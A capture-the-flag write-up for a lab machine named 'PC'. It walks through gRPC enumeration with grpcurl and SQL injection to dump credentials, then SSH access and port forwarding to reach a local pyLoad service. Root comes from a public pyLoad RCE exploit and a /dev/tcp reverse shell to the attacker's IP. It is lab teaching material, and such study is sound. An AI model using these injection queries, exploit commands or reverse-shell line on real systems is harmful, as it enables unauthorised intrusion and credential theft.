# PC

<figure><img src="Images/PC/PC.png" alt=""><figcaption></figcaption></figure>

## User Flag

### Enumeration

We run an nmap scan against all ports:\


```console
toasty@kali$ sudo nmap -p- 10.10.11.214
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-24 19:50 BST
Nmap scan report for 10.10.11.214
Host is up (0.031s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown
```

Once we get them back we run a service and script scan

```console
toasty@kali$ sudo nmap -sC -sV -p22,50051 10.10.11.214
...SNIP
PORT      STATE    SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open     unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.93%I=7%D=8/24%Time=64E7A714%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0
...SNIP
```

#### Port 50051

I am not sure what is running on port 50051 and trying to visit in a browser also gives us weird characters:

<figure><img src="Images/PC/port_50051.png" alt=""><figcaption></figcaption></figure>

Doing some google searches we find that it is a common and default port for [gRPC](https://xrpl.org/configure-grpc.html).

### gRPC

gRPC is a remote procedure call framework that can run in any environment. We need a way to interact with the this gRPC service though. That is where [grpcurl](https://github.com/fullstorydev/grpcurl) comes into play.

#### grpcurl

grpcurl is described as 'curl but for grpc'. We can download it from the link above and begin messing around with it. The `list` command shows all services available:\


```console
toasty@kali$ grpcurl -plaintext 10.10.11.214:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

We can see a service titled `SimpleApp`. We can also use the `list` command to show us all the methods available for a service:\


```console
toasty@kali$ grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

Alternatively, `describe` does all that in one go:\


```console
toasty@kali$ grpcurl -plaintext 10.10.11.214:50051 describe
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
grpc.reflection.v1alpha.ServerReflection is a service:
service ServerReflection {
  rpc ServerReflectionInfo ( stream .grpc.reflection.v1alpha.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1alpha.ServerReflectionResponse );
}
```

### SimpleApp

I would think `getInfo` would have something for us but it errors out as we need a valid `token`. If we knew the scheme of the token we could try and brute force this but we do not.:\


```console
toasty@kali$ grpcurl -plaintext 10.10.11.214:50051 SimpleApp.getInfo
{
  "message": "Authorization Error.Missing 'token' header"
}
```

Let's try to register a user instead.

#### RegisterUser Attempts

```console
toasty@kali$ grpcurl -plaintext 10.10.11.214:50051 SimpleApp.RegisterUser
{
  "message": "username or password must be greater than 4"
}
```

After a first attempt, we see that we need a username/password longer than 4 characters. Looking at the grpcurl docs, we can send data using the `-d` command in json format.

If we try a blank username/password we get a different error:

```console
toasty@kali$ grpcurl -plaintext -d '{"user":"","password":""}' 10.10.11.214:50051 SimpleApp.RegisterUser
Error invoking method "SimpleApp.RegisterUser": error getting request data: message type RegisterUserRequest has no known field named user

```

This let's us know that we are on the right track. The username/password key values are probably just that, `username` and `password`. We can now try a username/password of `toasty`:

````console

```console
toasty@kali$ grpcurl -plaintext -d '{"username":"toasty","password":"toasty"}' 10.10.11.214:50051 SimpleApp.RegisterUser
{
  "message": "Account created for user toasty!"
}
````

And we have succesfully created a new account.

#### Login

We can now use that account to hit the `LoginUser` method and we get an `id` back.

```console
toasty@kali$ grpcurl -plaintext -vv -d '{"username":"toasty","password":"toasty"}' 10.10.11.214:50051 SimpleApp.LoginUser

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 17 bytes

Response contents:
{
 "message": "Your id is 260."
}

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidG9hc3R5IiwiZXhwIjoxNjk3NTU1OTUyfQ.pr9pfuT2Db9NqGiJL8PhLuVT_WzEnD-RM1yX6jZxjLQ'
Sent 1 request and received 1 response

```

Unfortunately my steamroll slowed down here, I wasn't sure where to go. That's where `grpcui` came in.

### grpcui

[grpcui](https://github.com/fullstorydev/grpcui) runs `grpcurl` in the background but gives you an interactive web session as well.

For example, we can log in using grpcui.

<figure><img src="Images/PC/login_grpcui.png" alt=""><figcaption></figcaption></figure>

#### GetInfo

Now that we have a valid token we can run `getInfo` using our token and username:

<figure><img src="Images/PC/getinfo_token.png" alt=""><figcaption></figcaption></figure>

### Burp

If we have captured our requests in burp, we can now manipulate them and send them to the repeater. Looking at the request for `getInfo`, we can change the `id` to `1` and see what happens.

<figure><img src="Images/PC/getinfo_burp.png" alt=""><figcaption></figcaption></figure>

We see we have a new message saying `The admin is working hard to fix the issue`. We can mess around with the `id` and try to find other values but we don't get anything back. We are getting an error `Unexpected TypeError`.

#### SQL Injection

Playing around with the id parameter we are finally able to get somewhere with a `union` statement. Submitting our `id` as `0 union select null`, returns us the message `None` so we can see it works and there is 1 column for us to use.

<figure><img src="Images/PC/getinfo_unionpart1.png" alt=""><figcaption></figcaption></figure>

Now we need to find out what type of database we are dealing with so we can pull more information. Trying `@@version` and `version()` did not return anything, however `sqlite_version()` did return `3.31.1`.

<figure><img src="Images/PC/sqlite_versioninfo.png" alt=""><figcaption></figcaption></figure>

#### Getting Tables using sqlite\_master

Now that we know we are dealing with a sqlite database, we can use the `sqlite_master` table to get all the tables in the database. We can use the `group_concat` function to get all the tables in one go.

<figure><img src="Images/PC/sqlite_tables.png" alt=""><figcaption></figcaption></figure>

#### Getting Columns using sqlite\_master

We can see the tables, now we can use the same `sqlite_master` to pull the column names. Again we use `group_concat`.

<figure><img src="Images/PC/sqlite_columns.png" alt=""><figcaption></figcaption></figure>

#### Getting usernames and password from account table

I could not get this to work in a simplified view using a single query but I could pull the usernames and passwords using two seperate queries. We know that there are two names `username` and `password.` The respective queries are `"id":"0 union select group_concat(password) from accounts"` and `"id":"0 union select group_concat(username) from accounts"`.

**Usernames**

<figure><img src="Images/PC/sqlite_usernames.png" alt=""><figcaption></figcaption></figure>

**Passwords**

<figure><img src="Images/PC/sqlite_passwords.png" alt=""><figcaption></figcaption></figure>

We now have two usernames: `admin` and `sau`. We also have two passwords: `admin` and `HereIsYourPassWord1431`. Messing around with the open ssh port we find the combination of `sau:HereIsYourPasswrod1431`.

### SSH

```console
toasty@kali$ sshpass -p HereIsYourPassWord1431 ssh sau@10.10.11.214
Last login: Thu Aug 24 19:28:58 2023 from 10.10.15.94
sau@pc:~$ id
uid=1001(sau) gid=1001(sau) groups=1001(sau)
```

### User.txt

Now we can grab the user flag.

```console
sau@pc:~$ ls
user.txt
sau@pc:~$ cat user.txt 
cb605***************************
```

## Root Flag

This is always a hassle doing basic enumeration, I check sudo perms with `sudo -l`, transfer over `pspy` and have it check processes, and run a `linPEAs` script to scan things. `netstat` does reveal some interesting things.

```console
sau@pc:/tmp/tmp0esdfs$ netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN 
```

### Webpage

Hitting `localhost:8000` with a curl request sends us to the `/login` page and following that takes us to a login page, which we could view better from a browser.

```console
sau@pc:/tmp/tmp0esdfs$ curl localhost:8000/login
<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <link rel="stylesheet" type="text/css" href="/_themes/modern/vendor/Bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="/_themes/modern/vendor/jQuery/jQuery%20UI/jquery-ui.min.css"/>
    <link rel="stylesheet" type="text/css" href="/_themes/modern/vendor/mdtoast/css/mdtoast.min.css"/>
    <link rel="stylesheet" type="text/css" href="/_themes/modern/css/base.css" />

    <link rel="icon" href="/_themes/modern/img/favicon.ico"/>

<style type="text/css">
.ui-icon,
...SNIP

```

### Port Forwarding

Since this web page is hosted locally, and we have an ssh session. We can use SSH local port forwarding to access it. We can use the `-L` flag on SSH to set this up.

#### Setting it up

(Side note: I am using sshpass to show the password in the commandline but this would not be ideal in a real world scenario)

```console
toasty@kali$ sshpass -p HereIsYourPassWord1431 ssh -L 8005:localhost:8000 sau@10.10.11.214
```

Now from our host machine we can visit `localhost:8005` and see the webpage.

### pyLoad

We can see that everything works because we are greeted with a `pyload` homepage.

<figure><img src="Images/PC/pyload_homepage.png" alt=""><figcaption></figcaption></figure>

### CVE-2023-0927

An initial view of the site doesn't give us any information but googling for Pyload exploit's takes us to [CVE-2023-0927](https://nvd.nist.gov/vuln/detail/CVE-2023-0297). It leads to RCE during pre-auth abuse of `js2py`. It only works on certain versions of Pyload but we can test it out.

A good writeup is here by [bAuh0lz](https://github.com/bAuh0lz/CVE-2023-0297\_Pre-auth\_RCE\_in\_pyLoad). We actually use a different exploit written based off bAuh0lz discovery that was created by [0xGabe](https://www.exploit-db.com/exploits/51532).

### Verifying Exploitability

From here we can run the exploit code to verify that the server is vulnerable.

**HOST**

We have our local port forward running and download the above exploit to our current directory and name it `exploit.py`. We run the command `id` and save it to a tmp file to verify it works and to see who PyLoad is running as.

```console
toasty@kali$ python3 exploit.py -u http://localhost:8005 -c "id > /tmp/tmpdir/exploitfile"
[+] Check if target host is alive: http://localhost:8005
[+] Host up, let's exploit! 
[+] The exploit has be executeded in target machine. 
```

**TARGET**

Since the exploit said it was successful, we can read the temp file we created and see that we are able to run commands as `root`.

```console
sau@pc:/tmp/tmpdir$ ls
exploitfile
sau@pc:/tmp/tmpdir$ cat exploitfile 
uid=0(root) gid=0(root) groups=0(root)
```

### Getting Reverse Shell

We can use the command execution as root to get a reverse shell. Trying to directly input the reverse shell command in the exploit did not work so we can use a temp file to store the command and then execute it.

**TEMP FILE**

We host the file on the target machine at `/tmp/tmpdir/revshell` and it contains the following:

```console
/bin/sh -i >& /dev/tcp/10.10.14.112/8443 0>&1
```

**HOST**

Then we set up a listener on our host machine and run the exploit again. This time we `cat` out the contents of `revshell` file and pipe it to `bash` to execute it.

```console
python3 exploit.py -u http://localhost:8005 -c "cat /tmp/tmpdir/revshell | bash"
[+] Check if target host is alive: http://localhost:8005
[+] Host up, let's exploit! 
```

**LISTENER**

```console
toasty@kali$ nc -lvnp 8443
listening on [any] 8443 ...
connect to [10.10.14.112] from (UNKNOWN) [10.10.11.214] 49594
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)

```

### Root.txt

Now we can just cat the root flag.

```console
# cat /root/root.txt
a1f0***************************
```
